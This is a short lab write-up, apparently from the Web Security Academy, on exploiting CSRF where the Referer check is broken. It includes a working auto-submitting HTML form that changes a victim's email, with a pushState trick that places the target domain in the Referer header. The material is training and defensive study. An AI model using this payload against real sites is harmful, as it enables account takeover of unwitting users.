# CSRF with broken Referer validation
- lab's email change functionality is vulnerable to CSRF
- attempts to detect and block cross domain requests
- credentials: wiener:peter
# Goal
- use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address
# solving The Lab
- log in and change email
- for CSRF To be possibel
  - Certain Action : change email
  - cookie based session handeling : session cookie
  - no unpredictablle request parameters :
- now try our same expoit from burp csrf poc but we got n error that says invalid refer header
- now we test for referer header
  - remove referer headeer and check the response
  - check which portian of the header the application is validating and spoof it
- now our script
```
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://0a3e00cf04fb2d14815a61e800cd000a.web-security-academy.net/my-account/change-email" method="POST">

      <input type="hidden" name="email" value="test&#64;mail&#46;com" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/?0a3e00cf04fb2d14815a61e800cd000a.web-security-academy.net');

      document.forms[0].submit();

    </script>

  </body>

</html>


```
- lab is solved
  
